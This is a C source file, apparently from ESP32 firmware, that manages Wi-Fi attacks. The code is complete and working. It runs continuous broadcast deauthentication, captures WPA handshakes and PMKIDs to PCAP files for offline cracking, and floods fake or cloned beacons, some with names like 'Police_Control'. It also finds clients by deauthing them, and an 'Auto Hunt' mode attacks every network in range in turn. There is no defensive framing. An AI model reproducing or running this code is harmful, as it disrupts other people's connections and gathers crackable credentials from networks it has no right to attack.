#include "attack_manager.h"
#include "packet_handler.h"
#include "wifi_manager.h"
#include "filesystem_manager.h"
#include "web_server.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "cJSON.h"
#include <string.h>
#include <inttypes.h>
#include <arpa/inet.h>
#include <stdio.h>

static const char *TAG = "ATTACK_MANAGER";

typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed)) ieee80211_hdr_t;

typedef struct {
    ieee80211_hdr_t hdr;
    uint16_t qos_ctrl;
} __attribute__((packed)) ieee80211_qos_hdr_t;

typedef struct {
    uint8_t dsap;
    uint8_t ssap;
    uint8_t ctrl;
    uint8_t org_code[3];
    uint16_t eth_type;
} __attribute__((packed)) llc_snap_hdr_t;

typedef struct {
    uint16_t len;
    uint8_t data[];
} packet_queue_item_t;

static attack_state_t current_state = ATTACK_STATE_IDLE;
static TaskHandle_t attack_task_handle = NULL;
static QueueHandle_t packet_queue = NULL;
static volatile bool queue_active = false;
static volatile bool attack_stop_flag = false;
static uint8_t target_bssid_for_filter[6];
static volatile bool eapol_packets_captured = false;
static volatile bool pmkid_captured = false;
static volatile uint8_t handshake_messages_captured = 0;
static volatile bool target_beacon_captured = false;
static int g_auto_hunt_pmkid_time = 5;
static int g_auto_hunt_handshake_time = 10;
static TaskHandle_t auto_hunt_task_handle = NULL;

static client_list_t g_client_list;
static TaskHandle_t client_scan_task_handle = NULL;
static uint8_t client_scan_target_bssid[6];

#define MAX_BEACONS 100

typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
} virtual_beacon_t;

static virtual_beacon_t g_beacon_list[MAX_BEACONS];
static int g_beacon_count = 0;
static wifi_scan_data_t bf_scan_data;

static const char *bd_network_names[] = {
    "GP_WiFi", "Banglalink_Free", "Teletalk_3G", "Robi_4.5G", "Sarkar_WiFi",
    "Digital_Bangladesh", "TP-Link_Plus", "Tenda_Home", "Netis_2.4G", "Xiaomi_Extender",
    "D-Link_Router", "Cisco_AP", "Totolink", "Mercusys", "ASUS_ROG",
    "CyberCafe", "Student_Mess", "Bachelor_Point", "Mayer_Doa", "Bhai_Bhai_Store",
    "General_Store", "Pharmacy_WiFi", "Mosque_Free_WiFi", "Hospital_Guest", "Doctors_Chamber",
    "Advocate_Chamber", "Office_WiFi", "Admin_Network", "Staff_Only", "Guest_Access",
    "Free_Internet", "Virus_Detected", "Loading...", "Connecting...", "No_Internet",
    "Access_Denied", "Password_Is_1234", "Hack_Me_If_Can", "Surveillance_Van", "SB_Patrol",
    "Police_Control", "RAB_Unit_5", "Dhaka_WASA", "DESCO_Smart", "Titas_Gas",
    "Link3_Broadband", "AmberIT", "Carnival", "Dot_Internet", "Triangle"
};
#define BD_NET_COUNT 50

static void broadcast_status() {

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", "status");

    cJSON *data = cJSON_CreateObject();
    const char *wifi_state_str[] = {
        "IDLE", "DEAUTH_CONTINUOUS", "CAPTURE_CREDENTIALS", "EVIL_TWIN",
        "BEACON_FLOOD", "CLIENT_SCAN", "PMKID_CAPTURE", "AUTO_HUNT"
    };
    cJSON_AddStringToObject(data, "state", wifi_state_str[current_state]);

    char ssid[33], bssid[18];
    uint8_t channel;
    if (wifi_manager_get_target(ssid, bssid) == ESP_OK) {
        cJSON_AddBoolToObject(data, "has_target", true);
        cJSON_AddStringToObject(data, "target_ssid", ssid);
        cJSON_AddStringToObject(data, "target_bssid", bssid);
        if(wifi_manager_get_target_channel(&channel) == ESP_OK) {
            cJSON_AddNumberToObject(data, "target_channel", channel);
        }
    } else {
        cJSON_AddBoolToObject(data, "has_target", false);
    }

    cJSON_AddItemToObject(root, "data", data);

    char *json_str = cJSON_PrintUnformatted(root);
    web_server_broadcast_msg(json_str);
    free(json_str);
    cJSON_Delete(root);
}

static void broadcast_event(const char *msg) {
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", "log");
    cJSON_AddStringToObject(root, "data", msg);
    char *json_str = cJSON_PrintUnformatted(root);
    web_server_broadcast_msg(json_str);
    free(json_str);
    cJSON_Delete(root);
}

static void continuous_deauth_task(void *pvParameters) {
    uint8_t channel;
    char target_bssid_str[18];
    uint8_t target_bssid[6];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (wifi_manager_get_target(NULL, target_bssid_str) != ESP_OK) {
        ESP_LOGE(TAG, "No target set for deauth attack");
        current_state = ATTACK_STATE_IDLE;
        attack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    sscanf(target_bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);

    if (wifi_manager_get_target_channel(&channel) == ESP_OK) {
        wifi_manager_change_channel(channel);
    } else {
        ESP_LOGE(TAG, "Failed to get target channel");
        current_state = ATTACK_STATE_IDLE;
        attack_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "Starting continuous deauthentication attack on %s", target_bssid_str);
    packet_handler_start_deauth(broadcast_mac, target_bssid);

    while (!attack_stop_flag) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ESP_LOGI(TAG, "Stopping continuous deauthentication attack");
    packet_handler_stop_deauth();

    current_state = ATTACK_STATE_IDLE;
    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static void generate_random_mac(uint8_t *mac) {
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    mac[0] = 0x02;
    mac[1] = (r1 >> 0) & 0xFF;
    mac[2] = (r1 >> 8) & 0xFF;
    mac[3] = (r1 >> 16) & 0xFF;
    mac[4] = (r2 >> 0) & 0xFF;
    mac[5] = (r2 >> 8) & 0xFF;
}

static void generate_ssid_with_suffix(char *buffer, const char *base_name, int suffix_num) {
    if (suffix_num == 0) {
        strncpy(buffer, base_name, 32);
        buffer[32] = '\0';
    } else {
        char safe_base[33];
        strncpy(safe_base, base_name, 32);
        safe_base[32] = '\0';
        int suffix_len = snprintf(NULL, 0, "_%d", suffix_num);
        int available_len = 32 - suffix_len;
        if (strlen(safe_base) > available_len) safe_base[available_len] = '\0';
        snprintf(buffer, 33, "%s_%d", safe_base, suffix_num);
    }
}

static void inject_fake_beacon(FILE *f, const char *ssid, const uint8_t *bssid, uint8_t channel) {
    if (!f) return;
    uint8_t packet[128];
    int offset = 0;
    packet[offset++] = 0x80; packet[offset++] = 0x00;
    packet[offset++] = 0x00; packet[offset++] = 0x00;
    memset(&packet[offset], 0xFF, 6); offset += 6;
    memcpy(&packet[offset], bssid, 6); offset += 6;
    memcpy(&packet[offset], bssid, 6); offset += 6;
    packet[offset++] = 0x00; packet[offset++] = 0x00;
    memset(&packet[offset], 0, 8); offset += 8;
    packet[offset++] = 0x64; packet[offset++] = 0x00;
    packet[offset++] = 0x11; packet[offset++] = 0x04;
    int ssid_len = strlen(ssid);
    if(ssid_len > 32) ssid_len = 32;
    packet[offset++] = 0x00; packet[offset++] = ssid_len;
    memcpy(&packet[offset], ssid, ssid_len); offset += ssid_len;
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    packet[offset++] = 0x01; packet[offset++] = sizeof(rates);
    memcpy(&packet[offset], rates, sizeof(rates)); offset += sizeof(rates);
    packet[offset++] = 0x03; packet[offset++] = 0x01; packet[offset++] = channel;
    filesystem_manager_write_packet(f, packet, offset);
}

static int get_eapol_message_num(const uint8_t *data, size_t len) {

    if (len < 4 + 1 + 2) return 0;

    if (data[1] != 0x03) return 0;

    uint16_t key_info = (data[5] << 8) | data[6];

    bool has_mic = (key_info & 0x0100);
    bool has_ack = (key_info & 0x0080);
    bool is_secure = (key_info & 0x0200);

    if (!has_mic && has_ack) return 1;
    if (has_mic && !has_ack && !is_secure) return 2;
    if (has_mic && has_ack) return 3;
    if (has_mic && !has_ack && is_secure) return 4;

    if (has_mic && !has_ack) return 2;

    return 0;
}

static bool check_pmkid(const uint8_t *data, size_t len) {
    if (len < 97) return false;
    if (data[1] != 3) return false;

    uint16_t key_data_len = (data[95] << 8) | data[96];
    if (len < 97 + key_data_len) return false;

    const uint8_t *key_data = data + 97;
    int offset = 0;
    while (offset + 2 <= key_data_len) {
        uint8_t tag = key_data[offset];
        uint8_t tlen = key_data[offset+1];
        if (offset + 2 + tlen > key_data_len) break;

        if (tag == 0x30) {
            int rsn_off = 2;
            if (rsn_off + 8 > tlen) break;

            uint16_t pc_cnt = key_data[offset + rsn_off + 6] | (key_data[offset + rsn_off + 7] << 8);
            rsn_off += 8 + (pc_cnt * 4);

            if (rsn_off + 2 > tlen) break;
            uint16_t akm_cnt = key_data[offset + rsn_off] | (key_data[offset + rsn_off + 1] << 8);
            rsn_off += 2 + (akm_cnt * 4);

            if (rsn_off + 4 <= tlen) {
                 uint16_t pmkid_cnt = key_data[offset + rsn_off + 2] | (key_data[offset + rsn_off + 3] << 8);
                 if (pmkid_cnt > 0) return true;
            }
        }
        offset += 2 + tlen;
    }
    return false;
}

static void packet_capture_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const ieee80211_hdr_t *hdr = (ieee80211_hdr_t *)pkt->payload;
    bool should_save = false;

    uint16_t fc = hdr->frame_control;
    uint16_t type_mask = fc & 0x000C;
    uint16_t subtype_mask = fc & 0x00F0;

    if (type_mask == 0x0008) {
        int header_len = sizeof(ieee80211_hdr_t);
        if ((fc & 0x00f0) == 0x0080) header_len = sizeof(ieee80211_qos_hdr_t);
        if (pkt->rx_ctrl.sig_len > (header_len + sizeof(llc_snap_hdr_t))) {
            llc_snap_hdr_t *llc_snap = (llc_snap_hdr_t *)((uint8_t *)hdr + header_len);
            if (llc_snap->eth_type == htons(0x888e)) {
                if ((memcmp(hdr->addr1, target_bssid_for_filter, 6) == 0) ||
                    (memcmp(hdr->addr2, target_bssid_for_filter, 6) == 0) ||
                    (memcmp(hdr->addr3, target_bssid_for_filter, 6) == 0)) {

                    int msg_num = get_eapol_message_num((uint8_t *)llc_snap + sizeof(llc_snap_hdr_t),
                                                        pkt->rx_ctrl.sig_len - header_len - sizeof(llc_snap_hdr_t));

                    if (msg_num > 0 && msg_num != 4) {
                        should_save = true;
                        handshake_messages_captured |= (1 << (msg_num - 1));
                        ESP_LOGI(TAG, "Captured EAPOL Key Message %d", msg_num);

                        char msg_buf[32];
                        snprintf(msg_buf, sizeof(msg_buf), "Captured EAPOL M%d", msg_num);
                        broadcast_event(msg_buf);

                        if (msg_num == 1) {
                            if (check_pmkid((uint8_t *)llc_snap + sizeof(llc_snap_hdr_t),
                                            pkt->rx_ctrl.sig_len - header_len - sizeof(llc_snap_hdr_t))) {
                                if (!pmkid_captured) {
                                    ESP_LOGI(TAG, "PMKID Captured!");
                                    pmkid_captured = true;
                                    broadcast_event("PMKID Found!");
                                }
                            }
                        }

                        bool m1 = handshake_messages_captured & 0x01;
                        bool m2 = handshake_messages_captured & 0x02;
                        bool m3 = handshake_messages_captured & 0x04;

                        if (m1 && m2) ESP_LOGI(TAG, "Progress: M1 + M2 found. Waiting for M3...");
                        else if (m2 && m3) ESP_LOGI(TAG, "Progress: M2 + M3 found. Waiting for M1...");

                        if (m1 && m2 && m3) {
                            if (!eapol_packets_captured) {
                                ESP_LOGI(TAG, "Full Handshake (M1+M2+M3) captured! Stopping attack.");
                                eapol_packets_captured = true;
                                broadcast_event("Full Handshake Captured!");
                            }
                        }
                    }
                }
            }
        }
    }
    else if (type_mask == 0x0000 && !target_beacon_captured) {
        if (subtype_mask == 0x0080 || subtype_mask == 0x0050) {
            if (memcmp(hdr->addr3, target_bssid_for_filter, 6) == 0) {
                should_save = true;
                target_beacon_captured = true;
                ESP_LOGI(TAG, "Captured Target Beacon/Probe");
            }
        }
    }

    if (should_save && queue_active) {
        uint16_t len = pkt->rx_ctrl.sig_len;
        packet_queue_item_t *item = malloc(sizeof(packet_queue_item_t) + len);
        if (item) {
            item->len = len;
            memcpy(item->data, pkt->payload, len);
            if (queue_active) {
                if (xQueueSend(packet_queue, &item, 0) != pdPASS) free(item);
            } else {
                free(item);
            }
        }
    }
}

static void capture_task(void *pvParameters) {
    uint8_t channel;
    char target_bssid_str[18];
    char target_ssid[33];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (wifi_manager_get_target(target_ssid, target_bssid_str) != ESP_OK) {
        current_state = ATTACK_STATE_IDLE;
        vTaskDelete(NULL); return;
    }
    sscanf(target_bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_bssid_for_filter[0], &target_bssid_for_filter[1], &target_bssid_for_filter[2],
           &target_bssid_for_filter[3], &target_bssid_for_filter[4], &target_bssid_for_filter[5]);
    if (wifi_manager_get_target_channel(&channel) == ESP_OK) {
        wifi_manager_change_channel(channel);
    } else {
        current_state = ATTACK_STATE_IDLE;
        vTaskDelete(NULL); return;
    }

    eapol_packets_captured = false;
    pmkid_captured = false;
    handshake_messages_captured = 0;
    target_beacon_captured = false;

    packet_queue_item_t *temp_item;
    if (packet_queue) {
        while (xQueueReceive(packet_queue, &temp_item, 0) == pdPASS) {
            free(temp_item);
        }
    } else {

        packet_queue = xQueueCreate(64, sizeof(packet_queue_item_t *));
    }

    if (packet_queue == NULL) {
        current_state = ATTACK_STATE_IDLE;
        vTaskDelete(NULL); return;
    }
    queue_active = true;

    FILE *pcap_file = filesystem_manager_open_capture_file(target_ssid);
    if (pcap_file) {
        if (ftell(pcap_file) == 0) {
            filesystem_manager_write_pcap_header(pcap_file);
        }
        inject_fake_beacon(pcap_file, target_ssid, target_bssid_for_filter, channel);
        filesystem_manager_close_capture_file(pcap_file);
    }

    packet_handler_start_monitor(channel, packet_capture_callback);

    for(int i=0; i<20 && !target_beacon_captured && !attack_stop_flag; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ESP_LOGI(TAG, "Starting continuous deauth and capture...");
    packet_handler_start_deauth(broadcast_mac, target_bssid_for_filter);

    pcap_file = filesystem_manager_open_capture_file(target_ssid);

    while (!attack_stop_flag && !eapol_packets_captured && !pmkid_captured) {
        packet_queue_item_t *item;

        while (xQueueReceive(packet_queue, &item, 0) == pdPASS) {
            if (pcap_file) filesystem_manager_write_packet(pcap_file, item->data, item->len);
            free(item);
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    packet_queue_item_t *item;
    while (xQueueReceive(packet_queue, &item, 0) == pdPASS) {
        if (pcap_file) filesystem_manager_write_packet(pcap_file, item->data, item->len);
        free(item);
    }

    if (pcap_file) filesystem_manager_close_capture_file(pcap_file);

    packet_handler_stop_deauth();
    packet_handler_stop_monitor();

    bool partial_handshake = false;
    bool m1 = handshake_messages_captured & 0x01;
    bool m2 = handshake_messages_captured & 0x02;
    bool m3 = handshake_messages_captured & 0x04;

    if ((m1 && m2) || (m2 && m3)) partial_handshake = true;

    if (!eapol_packets_captured && !pmkid_captured && !partial_handshake) {

        char safe_ssid[64]; int j=0;
        for(int i=0; i<strlen(target_ssid) && j < 63; i++) {
             char c = target_ssid[i];
             if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') safe_ssid[j++] = c;
             else if (c == ' ') safe_ssid[j++] = '_';
        }
        safe_ssid[j] = '\0';
        if(strlen(safe_ssid)==0) strcpy(safe_ssid, "unknown");
        strcat(safe_ssid, ".pcap");

        if (pcap_file) {

        }
        filesystem_manager_delete_file(safe_ssid);
        ESP_LOGW(TAG, "Attack failed/stopped. No PMKID/Handshake found. Deleted partial PCAP: %s", safe_ssid);
        broadcast_event("Attack finished. No handshake captured.");
    } else {
        if (eapol_packets_captured) {
            ESP_LOGI(TAG, "Capture successful: Full Handshake (M1+M2+M3). PCAP saved.");
            broadcast_event("Success: Full Handshake Captured!");
        }
        else if (partial_handshake) {
            ESP_LOGI(TAG, "Capture Timeout: Partial Handshake saved (M1+M2 or M2+M3).");
            broadcast_event("Result: Partial Handshake Saved.");
        }
        else if (pmkid_captured) {
            ESP_LOGI(TAG, "Capture successful: PMKID found. PCAP saved.");
            broadcast_event("Success: PMKID Captured!");
        }
    }

    queue_active = false;
    vTaskDelay(pdMS_TO_TICKS(200));

    current_state = ATTACK_STATE_IDLE;
    attack_task_handle = NULL;
    broadcast_status();
    vTaskDelete(NULL);
}

static void beacon_flood_task(void *pvParameters) {
    while (!attack_stop_flag) {
        for (int i = 0; i < g_beacon_count; i++) {
            packet_handler_send_beacon_raw(g_beacon_list[i].ssid, g_beacon_list[i].bssid, g_beacon_list[i].channel);
            vTaskDelay(pdMS_TO_TICKS(10));
            if (attack_stop_flag) break;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    current_state = ATTACK_STATE_IDLE;
    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static void client_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const ieee80211_hdr_t *hdr = (ieee80211_hdr_t *)pkt->payload;

    // Ignore multicast/broadcast MACs in Addr1 and Addr2
    if (hdr->addr1[0] & 0x01 || hdr->addr2[0] & 0x01) return;

    // We are looking for clients communicating with the Target BSSID
    uint8_t *client_mac = NULL;

    // Check if target is Addr1 (Receiver) -> Addr2 is likely Client (Transmitter)
    if (memcmp(hdr->addr1, client_scan_target_bssid, 6) == 0) {
        client_mac = (uint8_t*)hdr->addr2;
    }
    // Check if target is Addr2 (Transmitter) -> Addr1 is likely Client (Receiver)
    else if (memcmp(hdr->addr2, client_scan_target_bssid, 6) == 0) {
        client_mac = (uint8_t*)hdr->addr1;
    }
    // Check if target is Addr3 (BSSID) -> Addr2 (Tx) or Addr1 (Rx) could be client
    else if (memcmp(hdr->addr3, client_scan_target_bssid, 6) == 0) {
         // If Addr2 is not BSSID, it's the client sending
         if (memcmp(hdr->addr2, client_scan_target_bssid, 6) != 0) {
             client_mac = (uint8_t*)hdr->addr2;
         }
         // If Addr1 is not BSSID, it's the client receiving
         else if (memcmp(hdr->addr1, client_scan_target_bssid, 6) != 0) {
             client_mac = (uint8_t*)hdr->addr1;
         }
    }

    if (client_mac) {
        bool exists = false;
        for(int i=0; i<g_client_list.count; i++) {
            if(memcmp(g_client_list.clients[i].mac, client_mac, 6) == 0) {
                exists = true;
                break;
            }
        }
        if (!exists && g_client_list.count < MAX_CLIENTS) {
            memcpy(g_client_list.clients[g_client_list.count].mac, client_mac, 6);
            g_client_list.count++;
        }
    }
}

static void client_scan_task(void *pvParameters) {
    uint8_t channel = (uintptr_t)pvParameters;
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    wifi_manager_change_channel(channel);
    packet_handler_start_deauth(broadcast_mac, client_scan_target_bssid);
    vTaskDelay(pdMS_TO_TICKS(5000));
    packet_handler_stop_deauth();
    packet_handler_start_monitor(channel, client_scan_callback);
    vTaskDelay(pdMS_TO_TICKS(10000));
    packet_handler_stop_monitor();
    current_state = ATTACK_STATE_IDLE;
    client_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

static void auto_hunt_task(void *pvParameters) {
    ESP_LOGI(TAG, "Starting Auto Hunt...");

    wifi_manager_stop_softap();
    vTaskDelay(pdMS_TO_TICKS(1000));

    ESP_LOGI(TAG, "Auto Hunt: Scanning networks...");
    wifi_scan_data_t scan_results;
    wifi_manager_scan_networks(&scan_results);

    ESP_LOGI(TAG, "Auto Hunt: Found %d networks. Starting attacks...", scan_results.count);

    for (int i = 0; i < scan_results.count; i++) {
        if (attack_stop_flag) break;

        char *ssid = scan_results.results[i].ssid;
        char *bssid_str = scan_results.results[i].bssid;

        wifi_manager_set_target(ssid, bssid_str);

        uint8_t target_ch = 0;
        wifi_manager_get_target_channel(&target_ch);
        ESP_LOGI(TAG, "Auto Hunt: Target %d/%d: %s (Ch %d). Starting PMKID attack...", i+1, scan_results.count, ssid, target_ch);

        bool pmkid_success = false;

        attack_manager_start_pmkid_capture();

        int elapsed = 0;
        int timeout_ms = g_auto_hunt_pmkid_time * 1000;

        while (elapsed < timeout_ms && !attack_stop_flag) {
            if (pmkid_captured) {
                pmkid_success = true;
                ESP_LOGI(TAG, "Auto Hunt: PMKID captured for %s!", ssid);
                break;
            }
            if (attack_task_handle == NULL) break;
            vTaskDelay(pdMS_TO_TICKS(100));
            elapsed += 100;
        }

        attack_manager_stop_pmkid_capture();

        while (attack_manager_get_state() != ATTACK_STATE_IDLE && !attack_stop_flag) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        current_state = ATTACK_STATE_AUTO_HUNT;

        attack_stop_flag = false;

        if (pmkid_success) {
            ESP_LOGI(TAG, "Auto Hunt: Success! PCAP saved for %s. Skipping Handshake.", ssid);
            continue;
        }

        if (attack_stop_flag) break;

        ESP_LOGI(TAG, "Auto Hunt [Handshake]: PMKID failed. Switching to Deauth/Handshake on %s...", ssid);

        attack_manager_start_capture();

        elapsed = 0;
        timeout_ms = g_auto_hunt_handshake_time * 1000;
        bool handshake_success = false;

        while (elapsed < timeout_ms && !attack_stop_flag) {
            if (eapol_packets_captured) {
                handshake_success = true;
                ESP_LOGI(TAG, "Auto Hunt: Full Handshake captured for %s!", ssid);
                break;
            }
             if (attack_task_handle == NULL) break;
            vTaskDelay(pdMS_TO_TICKS(100));
            elapsed += 100;
        }

        attack_manager_stop_capture();

        if (!handshake_success) {
            bool m1 = handshake_messages_captured & 0x01;
            bool m2 = handshake_messages_captured & 0x02;
            bool m3 = handshake_messages_captured & 0x04;

            if ((m1 && m2) || (m2 && m3)) {
                handshake_success = true;
                ESP_LOGI(TAG, "Auto Hunt: Timeout reached but Partial Handshake captured for %s!", ssid);
            }
        }

        while (attack_manager_get_state() != ATTACK_STATE_IDLE && !attack_stop_flag) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        current_state = ATTACK_STATE_AUTO_HUNT;

        attack_stop_flag = false;

        if (!handshake_success) {
            ESP_LOGI(TAG, "Auto Hunt: Failed to capture anything for %s. PCAP deleted.", ssid);
        } else {
            ESP_LOGI(TAG, "Auto Hunt: Handshake Success! PCAP saved for %s.", ssid);
        }
    }

    ESP_LOGI(TAG, "Auto Hunt Finished. Restoring SoftAP...");
    wifi_manager_start_softap();

    current_state = ATTACK_STATE_IDLE;
    auto_hunt_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t attack_manager_init(void) {
    current_state = ATTACK_STATE_IDLE;
    memset(&g_client_list, 0, sizeof(g_client_list));
    memset(&bf_scan_data, 0, sizeof(bf_scan_data));
    if (packet_queue == NULL) {
        packet_queue = xQueueCreate(64, sizeof(packet_queue_item_t *));
    }
    return ESP_OK;
}

esp_err_t attack_manager_start_continuous_deauth(void) {
    if (current_state != ATTACK_STATE_IDLE) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;
    if (!wifi_manager_has_target()) return ESP_FAIL;
    current_state = ATTACK_STATE_DEAUTH_CONTINUOUS;
    attack_stop_flag = false;
    xTaskCreate(continuous_deauth_task, "deauth_task", 4096, NULL, 10, &attack_task_handle);
    broadcast_status();
    return ESP_OK;
}

esp_err_t attack_manager_stop_continuous_deauth(void) {
    if (current_state != ATTACK_STATE_DEAUTH_CONTINUOUS) return ESP_ERR_INVALID_STATE;
    attack_stop_flag = true;

    broadcast_event("Stopping Deauth...");
    return ESP_OK;
}

esp_err_t attack_manager_start_capture(void) {
    if (current_state != ATTACK_STATE_IDLE && current_state != ATTACK_STATE_AUTO_HUNT) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;
    if (!wifi_manager_has_target()) return ESP_FAIL;
    current_state = ATTACK_STATE_CAPTURE_CREDENTIALS;
    attack_stop_flag = false;
    xTaskCreate(capture_task, "capture_task", 8192, NULL, 10, &attack_task_handle);
    broadcast_status();
    return ESP_OK;
}

esp_err_t attack_manager_stop_capture(void) {
    if (current_state != ATTACK_STATE_CAPTURE_CREDENTIALS) return ESP_ERR_INVALID_STATE;
    attack_stop_flag = true;
    broadcast_event("Stopping Capture...");
    return ESP_OK;
}

esp_err_t attack_manager_start_beacon_flood(beacon_flood_mode_t mode, const char *ssid_val, uint16_t amount) {
    if (current_state != ATTACK_STATE_IDLE) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;
    g_beacon_count = 0;
    if (mode == BEACON_MODE_CUSTOM) {
        for(int i = 0; i < amount && g_beacon_count < MAX_BEACONS; i++) {
            generate_ssid_with_suffix(g_beacon_list[g_beacon_count].ssid, ssid_val ? ssid_val : "ESP32", i);
            generate_random_mac(g_beacon_list[g_beacon_count].bssid);
            g_beacon_list[g_beacon_count].channel = (i % 11) + 1;
            g_beacon_count++;
        }
    } else if (mode == BEACON_MODE_CLONE) {
        wifi_manager_scan_networks(&bf_scan_data);
        int scan_count = bf_scan_data.count;
        if (scan_count > 0) {
            for (int i = 0; i < amount && g_beacon_count < MAX_BEACONS; i++) {
                generate_ssid_with_suffix(g_beacon_list[g_beacon_count].ssid, bf_scan_data.results[i % scan_count].ssid, i / scan_count);
                generate_random_mac(g_beacon_list[g_beacon_count].bssid);
                g_beacon_list[g_beacon_count].channel = bf_scan_data.results[i % scan_count].channel;
                g_beacon_count++;
            }
        }
    } else if (mode == BEACON_MODE_DATABASE) {
        for(int i = 0; i < amount && g_beacon_count < MAX_BEACONS; i++) {
            generate_ssid_with_suffix(g_beacon_list[g_beacon_count].ssid, bd_network_names[i % BD_NET_COUNT], i / BD_NET_COUNT);
            generate_random_mac(g_beacon_list[g_beacon_count].bssid);
            g_beacon_list[g_beacon_count].channel = (i % 11) + 1;
            g_beacon_count++;
        }
    }
    if (g_beacon_count == 0) return ESP_FAIL;
    current_state = ATTACK_STATE_BEACON_FLOOD;
    attack_stop_flag = false;
    xTaskCreate(beacon_flood_task, "bf_task", 4096, NULL, 10, &attack_task_handle);
    broadcast_status();
    return ESP_OK;
}

esp_err_t attack_manager_stop_beacon_flood(void) {
    if (current_state != ATTACK_STATE_BEACON_FLOOD) return ESP_ERR_INVALID_STATE;
    attack_stop_flag = true;
    broadcast_event("Stopping Beacon Flood...");
    return ESP_OK;
}

esp_err_t attack_manager_start_pmkid_capture(void) {
    if (current_state != ATTACK_STATE_IDLE && current_state != ATTACK_STATE_AUTO_HUNT) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;
    if (!wifi_manager_has_target()) return ESP_FAIL;
    current_state = ATTACK_STATE_PMKID_CAPTURE;
    attack_stop_flag = false;
    xTaskCreate(capture_task, "pmkid_task", 4096, NULL, 10, &attack_task_handle);
    broadcast_status();
    return ESP_OK;
}

esp_err_t attack_manager_stop_pmkid_capture(void) {
    if (current_state != ATTACK_STATE_PMKID_CAPTURE) return ESP_ERR_INVALID_STATE;
    attack_stop_flag = true;
    broadcast_event("Stopping PMKID Capture...");
    return ESP_OK;
}

esp_err_t attack_manager_start_client_scan(void) {
    if (current_state != ATTACK_STATE_IDLE) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;
    if (!wifi_manager_has_target()) return ESP_FAIL;
    uint8_t channel;
    char bssid_str[18];
    if (wifi_manager_get_target_channel(&channel) != ESP_OK) return ESP_FAIL;
    wifi_manager_get_target(NULL, bssid_str);
    sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &client_scan_target_bssid[0], &client_scan_target_bssid[1], &client_scan_target_bssid[2],
           &client_scan_target_bssid[3], &client_scan_target_bssid[4], &client_scan_target_bssid[5]);
    memset(&g_client_list, 0, sizeof(g_client_list));
    current_state = ATTACK_STATE_CLIENT_SCAN;
    xTaskCreate(client_scan_task, "client_scan_task", 4096, (void*)(uintptr_t)channel, 10, &client_scan_task_handle);
    return ESP_OK;
}

esp_err_t attack_manager_get_client_scan_results(client_list_t *list) {
    memcpy(list, &g_client_list, sizeof(client_list_t));
    return ESP_OK;
}

esp_err_t attack_manager_start_auto_hunt(int pmkid_time, int handshake_time) {
    if (current_state != ATTACK_STATE_IDLE) return ESP_ERR_INVALID_STATE;
    if (wifi_manager_is_repeater_active()) return ESP_ERR_INVALID_STATE;

    g_auto_hunt_pmkid_time = (pmkid_time > 0) ? pmkid_time : 5;
    g_auto_hunt_handshake_time = (handshake_time > 0) ? handshake_time : 10;

    current_state = ATTACK_STATE_AUTO_HUNT;
    attack_stop_flag = false;
    xTaskCreate(auto_hunt_task, "auto_hunt", 8192, NULL, 5, &auto_hunt_task_handle);
    return ESP_OK;
}

esp_err_t attack_manager_stop_auto_hunt(void) {
    if (current_state != ATTACK_STATE_AUTO_HUNT) return ESP_ERR_INVALID_STATE;
    attack_stop_flag = true;

    return ESP_OK;
}

attack_state_t attack_manager_get_state(void) { return current_state; }
void attack_manager_set_state(attack_state_t new_state) { current_state = new_state; }

